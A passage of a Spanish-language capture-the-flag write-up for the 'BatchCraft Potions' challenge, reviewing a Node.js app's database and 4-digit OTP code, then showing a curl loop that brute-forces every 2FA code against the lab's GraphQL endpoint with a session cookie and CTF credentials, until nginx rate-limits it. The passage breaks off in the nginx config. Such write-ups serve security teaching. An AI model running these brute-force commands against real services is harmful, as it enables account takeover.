<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`SELECT otpkey FROM users WHERE username = ?`</span><span class="mtk1">;</span>
<span class="mtk1">      </span><span class="mtk9">this</span><span class="mtk1">.connection.</span><span class="mtk8">query</span><span class="mtk1">(</span>
<span class="mtk1">                </span><span class="mtk1">stmt</span><span class="mtk1">,</span>
<span class="mtk1">                [</span>
<span class="mtk1">                    </span><span class="mtk7 mtki">String</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">)</span>
<span class="mtk1">                ],</span>
<span class="mtk1">                (</span><span class="mtk9 mtki">err</span><span class="mtk1">, </span><span class="mtk9 mtki">result</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                        </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">rows</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">parse</span><span class="mtk1">(</span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">stringify</span><span class="mtk1">(</span><span class="mtk9 mtki">result</span><span class="mtk1">))</span>
<span class="mtk1">                        </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk1">rows</span><span class="mtk1">.length </span><span class="mtk5">?</span><span class="mtk1"> </span><span class="mtk1">rows</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">:</span><span class="mtk1"> {})</span>
<span class="mtk1">                    }</span>
<span class="mtk1">                    </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">)</span>
<span class="mtk1">                    }</span>
<span class="mtk1">          }</span>
<span class="mtk1">            )</span>
<span class="mtk1">    });</span>
<span class="mtk1">  }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">getPotions</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`SELECT * FROM products where product_approved = 1</span><span class="mtk4">`</span><span class="mtk1">;</span>
<span class="mtk1">      </span><span class="mtk9">this</span><span class="mtk1">.connection.</span><span class="mtk8">query</span><span class="mtk1">(</span>
<span class="mtk1">                </span><span class="mtk1">stmt</span><span class="mtk1">, [],</span>
<span class="mtk1">                (</span><span class="mtk9 mtki">err</span><span class="mtk1">, </span><span class="mtk9 mtki">result</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                        </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">parse</span><span class="mtk1">(</span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">stringify</span><span class="mtk1">(</span><span class="mtk9 mtki">result</span><span class="mtk1">)))</span>
<span class="mtk1">                    }</span>
<span class="mtk1">                    </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">)</span>
<span class="mtk1">                    }</span>
<span class="mtk1">          }</span>
<span class="mtk1">            )</span>
<span class="mtk1">    });</span>
<span class="mtk1">  }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">getPotionsByUser</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`SELECT * FROM products WHERE product_seller = ?`</span><span class="mtk1">;</span>
<span class="mtk1">      </span><span class="mtk9">this</span><span class="mtk1">.connection.</span><span class="mtk8">query</span><span class="mtk1">(</span>
<span class="mtk1">                </span><span class="mtk1">stmt</span><span class="mtk1">,</span>
<span class="mtk1">                [</span>
<span class="mtk1">                    </span><span class="mtk7 mtki">String</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">)</span>
<span class="mtk1">                ],</span>
<span class="mtk1">                (</span><span class="mtk9 mtki">err</span><span class="mtk1">, </span><span class="mtk9 mtki">result</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                        </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">parse</span><span class="mtk1">(</span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">stringify</span><span class="mtk1">(</span><span class="mtk9 mtki">result</span><span class="mtk1">)))</span>
<span class="mtk1">                    }</span>
<span class="mtk1">                    </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">)</span>
<span class="mtk1">                    }</span>
<span class="mtk1">          }</span>
<span class="mtk1">            )</span>
<span class="mtk1">    });</span>
<span class="mtk1">  }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">getPotionByID</span><span class="mtk1">(</span><span class="mtk9 mtki">id</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`SELECT * FROM products WHERE id = ?`</span><span class="mtk1">;</span>
<span class="mtk1">      </span><span class="mtk9">this</span><span class="mtk1">.connection.</span><span class="mtk8">query</span><span class="mtk1">(</span>
<span class="mtk1">                </span><span class="mtk1">stmt</span><span class="mtk1">,</span>
<span class="mtk1">                [</span>
<span class="mtk1">                    </span><span class="mtk7 mtki">String</span><span class="mtk1">(</span><span class="mtk9 mtki">id</span><span class="mtk1">)</span>
<span class="mtk1">                ],</span>
<span class="mtk1">                (</span><span class="mtk9 mtki">err</span><span class="mtk1">, </span><span class="mtk9 mtki">result</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                        </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">rows</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">parse</span><span class="mtk1">(</span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">stringify</span><span class="mtk1">(</span><span class="mtk9 mtki">result</span><span class="mtk1">))</span>
<span class="mtk1">                        </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk1">rows</span><span class="mtk1">.length </span><span class="mtk5">?</span><span class="mtk1"> </span><span class="mtk1">rows</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">:</span><span class="mtk1"> {})</span>
<span class="mtk1">                    }</span>
<span class="mtk1">                    </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">)</span>
<span class="mtk1">                    }</span>
<span class="mtk1">          }</span>
<span class="mtk1">            )</span>
<span class="mtk1">    });</span>
<span class="mtk1">  }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">getAddedPotionID</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`SELECT id FROM products WHERE product_seller = ? </span><span class="mtk4">ORDER BY id DESC LIMIT 1`</span><span class="mtk1">;</span>
<span class="mtk1">      </span><span class="mtk9">this</span><span class="mtk1">.connection.</span><span class="mtk8">query</span><span class="mtk1">(</span>
<span class="mtk1">                </span><span class="mtk1">stmt</span><span class="mtk1">,</span>
<span class="mtk1">                [</span>
<span class="mtk1">                    </span><span class="mtk7 mtki">String</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">)</span>
<span class="mtk1">                ],</span>
<span class="mtk1">                (</span><span class="mtk9 mtki">err</span><span class="mtk1">, </span><span class="mtk9 mtki">result</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                        </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">rows</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">parse</span><span class="mtk1">(</span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">stringify</span><span class="mtk1">(</span><span class="mtk9 mtki">result</span><span class="mtk1">))</span>
<span class="mtk1">                        </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk1">rows</span><span class="mtk1">.length </span><span class="mtk5">?</span><span class="mtk1"> </span><span class="mtk1">rows</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">:</span><span class="mtk1"> {})</span>
<span class="mtk1">                    }</span>
<span class="mtk1">                    </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">)</span>
<span class="mtk1">                    }</span>
<span class="mtk1">          }</span>
<span class="mtk1">            )</span>
<span class="mtk1">    });</span>
<span class="mtk1">  }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">addPotion</span><span class="mtk1">(</span><span class="mtk9 mtki">data</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`</span>
<span class="mtk4">            INSERT INTO products(</span>
<span class="mtk4">                product_name,</span>
<span class="mtk4">                product_desc,</span>
<span class="mtk4">                product_price,</span>
<span class="mtk4">                product_category,</span>
<span class="mtk4">                product_keywords,</span>
<span class="mtk4">                product_og_title,</span>
<span class="mtk4">                product_og_desc,</span>
<span class="mtk4">                product_seller,</span>
<span class="mtk4">                product_approved</span>
<span class="mtk4">            )</span>
<span class="mtk4">            VALUES (?,?,?,?,?,?,?,?,?)`</span><span class="mtk1">;</span>

<span class="mtk1">      </span><span class="mtk9">this</span><span class="mtk1">.connection.</span><span class="mtk8">query</span><span class="mtk1">(</span>
<span class="mtk1">                </span><span class="mtk1">stmt</span><span class="mtk1">,</span>
<span class="mtk1">                [</span>
<span class="mtk1">                    </span><span class="mtk9 mtki">data</span><span class="mtk1">.product_name,</span>
<span class="mtk1">                    </span><span class="mtk9 mtki">data</span><span class="mtk1">.product_desc,</span>
<span class="mtk1">                    </span><span class="mtk9 mtki">data</span><span class="mtk1">.product_price,</span>
<span class="mtk1">                    </span><span class="mtk9 mtki">data</span><span class="mtk1">.product_category,</span>
<span class="mtk1">                    </span><span class="mtk9 mtki">data</span><span class="mtk1">.product_keywords,</span>
<span class="mtk1">                    </span><span class="mtk9 mtki">data</span><span class="mtk1">.product_og_title,</span>
<span class="mtk1">                    </span><span class="mtk9 mtki">data</span><span class="mtk1">.product_og_desc,</span>
<span class="mtk1">                    </span><span class="mtk9 mtki">data</span><span class="mtk1">.product_seller,</span>
<span class="mtk1">                    </span><span class="mtk9 mtki">data</span><span class="mtk1">.product_approved</span>
<span class="mtk1">                ],</span>
<span class="mtk1">                (</span><span class="mtk9 mtki">err</span><span class="mtk1">, </span><span class="mtk9 mtki">_</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                       </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                    </span><span class="mtk8">resolve</span><span class="mtk1">()</span>
<span class="mtk1">          }</span>
<span class="mtk1">            )</span>
<span class="mtk1">    });</span>
<span class="mtk1">  }</span>

<span class="mtk1">}</span>

<span class="mtk8 mtku">module</span><span class="mtk1">.</span><span class="mtk8 mtku">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Database</span><span class="mtk1">;</span>
</code></pre></div><p>Todo parece correcto ya que las consultas están utilizando sentencias preparadas (<em>prepared statements</em>), por lo que la inyección SQL no es posible.</p><p>Por suerte, tenemos credenciales válidas: <code>vendor53:PotionsFTW!</code>.</p><p><img src="/images/other/HTB%20UniCTF/BatchCraft-Potions-2.png" alt="BatchCraft Potions 2"></p><p>Por desgracia, hay 2FA habilitado&mldr;</p><p><img src="/images/other/HTB%20UniCTF/BatchCraft-Potions-3.png" alt="BatchCraft Potions 3"></p><p><img src="/images/other/HTB%20UniCTF/BatchCraft-Potions-4.png" alt="BatchCraft Potions 4"></p><h3 id="implementación-de-otp">Implementación de OTP</h3><p>El 2FA utiliza una implementación de OTP en <code>helpers/OTPHelper.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> { authenticator } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'@otplib/preset-default'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> qrcode            </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'qrcode'</span><span class="mtk1">);</span>

<span class="mtk1">authenticator.options </span><span class="mtk5">=</span><span class="mtk1"> { </span><span class="mtk1">digits</span><span class="mtk1">: </span><span class="mtk6">4</span><span class="mtk1"> };</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">genSecret</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> authenticator.</span><span class="mtk8">generateSecret</span><span class="mtk1">();</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">genPin</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">secret</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> authenticator.</span><span class="mtk8">generate</span><span class="mtk1">(</span><span class="mtk9 mtki">secret</span><span class="mtk1">);</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">genQRcode</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">username</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">otpauth</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> authenticator.</span><span class="mtk8">keyuri</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">, </span><span class="mtk4">'Genesis'</span><span class="mtk1">, </span><span class="mtk9 mtki">secret</span><span class="mtk1">);</span>  
<span class="mtk1">        qrcode.</span><span class="mtk8">toDataURL</span><span class="mtk1">(</span><span class="mtk1">otpauth</span><span class="mtk1">, (</span><span class="mtk9 mtki">err</span><span class="mtk1">, </span><span class="mtk9 mtki">imageUrl</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">err</span><span class="mtk1">) </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk9 mtki">imageUrl</span><span class="mtk1">);</span>
<span class="mtk1">        });</span>
<span class="mtk1">    });</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">verifyOTP</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">otpkey</span><span class="mtk1">, </span><span class="mtk9 mtki">otp</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">            isValid </span><span class="mtk5">=</span><span class="mtk1"> authenticator.</span><span class="mtk8">check</span><span class="mtk1">(</span><span class="mtk9 mtki">otp</span><span class="mtk1">, </span><span class="mtk9 mtki">otpkey</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (isValid) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk6">false</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">err</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk6">false</span><span class="mtk1">);</span>
<span class="mtk1">        }</span>
<span class="mtk1">    });</span>
<span class="mtk1">}</span>

<span class="mtk7 mtki">module</span><span class="mtk1">.</span><span class="mtk7 mtki">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk8">genQRcode</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk8">genSecret</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk8">verifyOTP</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk8">genPin</span>
<span class="mtk1">}</span>
</code></pre></div><p>Utiliza <code>@otplib/preset-default</code> con una versión actualizada. Nada parece ser vulnerable aquí. Aunque hay una manera de generar un código QR, esta funcionalidad nunca se usa.</p><p>Los códigos OTP tienen 4 dígitos, lo que lo hace propenso a un ataque de fuerza bruta. Podemos copiar la petición del navegador como un comando <code>curl</code> y realizar el ataque de fuerza bruta con un bucle:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 178.62.84.158:32007/graphql -d <span class="code-dark-yellow">'{"query":"mutation($otp: String!) { verify2FA(otp: $otp) { message, token } }","variables":{"otp":"1234"}}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span> -H <span class="code-dark-yellow">'Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZlbmRvcjUzIiwidmVyaWZpZWQiOmZhbHNlLCJpYXQiOjE2NzAzMTkzNDN9.zac2-EkzJ8Ly4newAgepKVqPk2P0u22YZAkR3y0sPqk'</span>
{"errors":[{"message":"Error: Invalid OTP supplied!","locations":[{"line":1,"column":27}],"path":["verify2FA"]}],"data":{"verify2FA":null}}

<span class="code-cyan">$</span> <span class="code-dark-yellow">for</span> c in {0000..9999}; <span class="code-dark-yellow">do</span> <span class="code-dark-green">echo</span> $c; <span class="code-dark-yellow">done</span> | <span class="code-dark-green">head</span>
0000
0001
0002
0003
0004
0005
0006
0007
0008
0009

<span class="code-cyan">$</span> <span class="code-dark-yellow">for</span> c in {0000..9999}; <span class="code-dark-yellow">do</span> <span class="code-dark-green">curl</span> 178.62.84.158:32007/graphql -d <span class="code-dark-yellow">'{"query":"mutation($otp: String!) { verify2FA(otp: $otp) { message, token } }","variables":{"otp":"'</span>$c<span class="code-dark-yellow">'"}}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span> -H <span class="code-dark-yellow">'Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZlbmRvcjUzIiwidmVyaWZpZWQiOmZhbHNlLCJpYXQiOjE2NzAzMTkzNDN9.zac2-EkzJ8Ly4newAgepKVqPk2P0u22YZAkR3y0sPqk'</span>; <span class="code-dark-green">echo</span>; <span class="code-dark-yellow">done</span>  
{"errors":[{"message":"Error: Invalid OTP supplied!","locations":[{"line":1,"column":27}],"path":["verify2FA"]}],"data":{"verify2FA":null}}
{"errors":[{"message":"Error: Invalid OTP supplied!","locations":[{"line":1,"column":27}],"path":["verify2FA"]}],"data":{"verify2FA":null}}
{"errors":[{"message":"Error: Invalid OTP supplied!","locations":[{"line":1,"column":27}],"path":["verify2FA"]}],"data":{"verify2FA":null}}
{"errors":[{"message":"Error: Invalid OTP supplied!","locations":[{"line":1,"column":27}],"path":["verify2FA"]}],"data":{"verify2FA":null}}
{"errors":[{"message":"Error: Invalid OTP supplied!","locations":[{"line":1,"column":27}],"path":["verify2FA"]}],"data":{"verify2FA":null}}
{"errors":[{"message":"Error: Invalid OTP supplied!","locations":[{"line":1,"column":27}],"path":["verify2FA"]}],"data":{"verify2FA":null}}
&lt;html&gt;
&lt;head&gt;&lt;title&gt;429 Too Many Requests&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;429 Too Many Requests&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;html&gt;
&lt;head&gt;&lt;title&gt;429 Too Many Requests&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;429 Too Many Requests&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;html&gt;
&lt;head&gt;&lt;title&gt;429 Too Many Requests&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;429 Too Many Requests&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div><p>Bueno, al menos lo hemos intentado. Hay un límite de velocidad establecido en la configuración de nginx:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">pid</span> /run/nginx.pid;
<span class="mtk5">error_log</span> /dev/stderr info;

<span class="mtk7">events</span> {
    <span class="mtk5">worker_connections</span> <span class="mtk4">1024</span>;
}

<span class="mtk7">http</span> {
    <span class="mtk5">server_tokens</span> <span class="mtk6">off</span>;
    <span class="mtk5">log_format</span> docker <span class="mtk4">'</span>$remote_addr $remote_user $status <span class="mtk4">"</span>$request<span class="mtk4">" "</span>$http_referer<span class="mtk4">" "</span>$http_user_agent<span class="mtk4">" '</span>;  
    <span class="mtk5">access_log</span> /dev/stdout docker;

    <span class="mtk5">charset</span> utf-8;
    <span class="mtk5">keepalive_timeout</span> <span class="mtk6">20s</span>;
    <span class="mtk5">sendfile</span> <span class="mtk6">on</span>;
    <span class="mtk5">tcp_nopush</span> <span class="mtk6">on</span>;
    <span class="mtk5">client_max_body_size</span> <span class="mtk6">1M</span>;

    <span class="mtk5">include</span>  /etc/nginx/mime.types;

